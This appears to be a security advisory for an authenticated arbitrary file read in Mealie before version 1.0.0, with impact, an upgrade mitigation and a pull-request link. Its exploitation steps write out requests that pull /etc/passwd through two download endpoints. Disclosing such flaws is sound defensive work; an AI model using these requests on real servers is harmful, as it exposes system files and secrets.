---
title: "Authenticated Arbitrary File Read in Mealie"
date: 2024-01-29
tags:
	- "arbitrary file read"
advisory: true
origin:
cves: 
	- CVE-2024-
ghsas:
---
# Description
Mealie before version 1.0.0 is vulnerable to authenticated arbitrary file read due to improper validation of the path in the `/api/recipes/bulk-actions/export/download` and `/api/utils/download` endpoints.

# Explotation
1. Fetch a valid JWT token from the URL:
`http://Mealie-domain/api/recipes/bulk-actions/export/download?p
ath=%2Fetc%2Fpasswd`
2. Download the file using the JWT token provided:
`http://Mealie-domain/api/utils/download?token=<TOKEN>`

# Impact
Any authenticated user can generate an API token and thus access the API. Using this
vulnerability, an authenticated attacker can read arbitrary files from the server leading to
different impacts from confidentiality to RCE via secrets/keys exfiltration.

# Mitigation
Upgrade Mealie to version `1.0.0` or later

# References
* [Pull request](https://github.com/mealie-recipes/mealie/pull/2867)